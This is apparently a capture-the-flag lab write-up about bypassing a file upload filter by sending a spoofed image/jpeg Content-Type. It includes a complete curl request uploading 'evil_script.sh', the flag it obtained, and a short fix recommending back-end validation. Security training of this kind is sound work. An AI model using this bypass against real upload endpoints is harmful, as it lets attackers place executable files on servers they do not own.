# Upload Bypass

### Breach Description:

The file upload file improperly checks the format of files that are uploaded, relying on the indicated content type, allowing us to upload any type of file, as long as we manually specify a “image/jpeg” Content type.

### Explanation of the breach:

When playing around with the file upload we quickly notice that the file upload field will only accept .jpg files. This is unfortunate as we would like to upload other files, like super_hacking_script.html and prom_video.mp4.

So the first thing we can try is to lie, and simply change the extension of our files to jpg.

This “works” but gets us no flags, and is not quite good enough for us, as we would like not to break our files.

The “MAX_FILE_SIZE” is also set in the front end, which is odd, but does not seem to be what can trigger the flag.

However, exporting the request and modifying it to keep the content type, but change the file with curl gives us:

```jsx
curl 'http://192.168.64.4/?page=upload' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8' \
-H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymFT7BcI67jE7pfyE' \
-H 'Referer: http://192.168.64.4/?page=upload' \
--data-raw $'------WebKitFormBoundarymFT7BcI67jE7pfyE\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n100000\r\n------WebKitFormBoundarymFT7BcI67jE7pfyE\r\nContent-Disposition: form-data; name="uploaded"; filename=evil_script.sh"\r\nContent-Type: image/jpeg\r\n\r\n\r\n------WebKitFormBoundarymFT7BcI67jE7pfyE\r\nContent-Disposition: form-data; name="Upload"\r\n\r\nUpload\r\n------WebKitFormBoundarymFT7BcI67jE7pfyE--\r\n' \
--compressed \
--insecure
```

Which will helpfully get us the following flag:

46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8

### Breach Fix:

Validating the file type in the back end and not relying on information from the front end is the minimum where security is concerned. All information coming from the front end can be intercepted, modified, and its integrity cannot be ensured.
